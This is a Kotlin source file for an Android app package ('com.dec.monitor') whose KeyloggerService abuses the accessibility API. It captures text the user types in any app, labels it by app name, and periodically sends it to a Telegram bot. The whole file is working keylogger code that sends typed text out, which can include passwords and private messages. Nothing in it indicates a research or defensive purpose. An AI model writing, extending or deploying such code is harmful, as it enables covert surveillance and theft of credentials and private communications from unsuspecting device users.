package com.dec.monitor.input

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.view.accessibility.AccessibilityEvent
import com.dec.monitor.TelegramBot
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class KeyloggerService : AccessibilityService() {

    private val buffer = StringBuilder()
    private var lastApp = ""
    private var lastFlush = System.currentTimeMillis()

    override fun onServiceConnected() {
        serviceInfo = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                    AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
            notificationTimeout = 100
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return

        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                val app = event.packageName?.toString() ?: return
                if (app != lastApp && buffer.isNotEmpty()) {
                    flushBuffer(lastApp)
                }
                lastApp = app
            }
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val text = event.text.joinToString("")
                if (text.isNotBlank()) {
                    buffer.clear()
                    buffer.append(text)
                }
                // flush every 10s or when buffer is big
                val now = System.currentTimeMillis()
                if (now - lastFlush > 10_000 || buffer.length > 200) {
                    flushBuffer(lastApp)
                    lastFlush = now
                }
            }
        }
    }

    private fun flushBuffer(app: String) {
        if (buffer.isBlank()) return
        val text = buffer.toString()
        buffer.clear()
        CoroutineScope(Dispatchers.IO).launch {
            TelegramBot.sendMessage("⌨️ <b>$app</b>\n$text")
        }
    }

    override fun onInterrupt() {}
}
